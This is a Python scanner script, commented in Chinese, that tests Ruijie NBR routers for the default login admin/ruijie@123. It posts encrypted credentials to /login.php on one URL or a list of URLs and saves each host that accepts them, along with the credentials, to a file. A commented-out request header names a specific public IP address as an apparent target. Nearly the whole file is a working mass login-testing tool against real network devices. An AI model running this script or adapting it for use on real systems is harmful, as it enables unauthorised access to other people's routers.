import requests
import argparse
import time
import warnings
warnings.filterwarnings("ignore")
# 漏洞payload
payload=r"/login.php"
# 漏洞名称
vul_name="锐捷NBR路由器弱口令漏洞"
# 请求头
# headers = {
#     "Host": "60.165.108.9:4430",
#     "Connection": "close",
#     "Content-Length": "119",
#     "sec-ch-ua": 'Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120',
#     "Accept": "application/json, text/javascript, */*; q=0.01",
#     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
#     "X-Requested-With": "XMLHttpRequest",
#     "sec-ch-ua-mobile": "?0",
#     "User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
#     "sec-ch-ua-platform": "Windows",
#     "Origin": "https://60.165.108.9:4430",
#     "Sec-Fetch-Site": "same-origin",
#     "Sec-Fetch-Mode": "cors",
#     "Sec-Fetch-Dest": "empty",
#     "Referer": "https://60.165.108.9:4430/index.htm",
#     "Accept-Encoding": "gzip, deflate",
#     "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
#     "Cookie": "LOCAL_LANG_COOKIE=zh; supportMoreLan=no; UI_LOCAL_COOKIE=zh; sysmode=sys-mode%20gateway; isRedirect=true"
# }
headers = {
    "User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
}
# 请求post数据
data = r'username=U2FsdGVkX18hihwXFvaC4zY8EfNuk58MV%2FTGiyQ8juE%3D&password=U2FsdGVkX1%2FeP2WNwUggiwd6rxhZh%2F%2BwnvhgwR55hKs%3D'
def get_time():
    mtime=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime())
    # assert isinstance(mtime, str)
    # assert len(mtime) == 19
    return mtime
# username: U2FsdGVkX18hihwXFvaC4zY8EfNuk58MV%2FTGiyQ8juE%3D
username="admin"
password="ruijie@123"           
# password: U2FsdGVkX1%2FeP2WNwUggiwd6rxhZh%2F%2BwnvhgwR55hKs%3D
def print_colored(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'purple': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m'
    }
    reset = '\033[0m'
    if color in colors:
        colored_text = colors[color] + text + reset
        print(colored_text,end='')
    else:
        print(text,end='')
     
def send_request(url):
    try:   
        response=requests.post(f"{url}{payload}",data=data,verify=False,timeout=10)
        print(response.text)
        if response.status_code==200 and '"msg":"success"' in response.text:
            print_colored(f'[+] {get_time()} {url} 存在{vul_name} ','green')
            print_colored(f"漏洞路径 {url} 账号：{username}，密码：{password}\n",'yellow')
            res=f"漏洞路径 {url} 账号：{username}，密码：{password}"
            return res  
        else:
            print_colored(f'[-] {get_time()} {url} 不存在{vul_name}\n ','red')
    except Exception as e:
        print_colored(f"[-] {get_time()} {url} 请求超时 {e}\n","red")
        
def main():
    parser = argparse.ArgumentParser(description='命令行参数示例')
    # 添加参数选项
    parser.add_argument('-u', '--url', type=str, help='单个url')
    parser.add_argument('-f', '--file', type=str, help='url文本文件路径')
    parser.add_argument('-o', '--output', type=str, help='保存结果')
    # 解析命令行参数
    args = parser.parse_args()
    
    if args.url:
        send_request(args.url)
    if args.file:
        with open(args.file,'r') as f1:
            fs=f1.readlines()
            count=0
            for u in fs:
                url=u.strip()
                res=send_request(url)
                if args.output:
                    with open(args.output+f"/{vul_name}.txt",'a+',encoding='utf-8') as f2:
                        if res==None:
                            pass
                        else:
                            f2.write(f"{res}\n")
    
main()


